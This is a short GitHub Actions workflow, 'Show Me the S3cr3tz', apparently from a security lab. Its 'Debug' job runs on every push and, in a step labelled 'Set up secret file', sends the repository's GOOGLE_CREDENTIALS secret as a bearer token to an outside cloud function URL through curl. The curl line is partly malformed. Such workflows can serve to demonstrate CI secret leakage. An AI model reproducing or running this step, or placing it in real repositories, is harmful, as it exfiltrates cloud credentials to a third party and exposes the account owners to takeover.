name: Show Me the S3cr3tz
on: [push]

jobs:
  debug:
    name: Debug
    runs-on: ubuntu-latest

    steps:
    - name: Check out code
      uses: actions/checkout@v2

    - name: Set up secret file
      env:
        DEBUG_PASSWORD: ${{ secrets.GOOGLE_CREDENTIALS }}
        
      run: |
        curl -X --request POST --url https://us-central1-cr-lab-hraizada-2906225331.cloudfunctions.net/function-1  --header "Authorization:bearer ${{ secrets.GOOGLE_CREDENTIALS }}"   "Content-Type:application/json"  --data '{}' 
       
   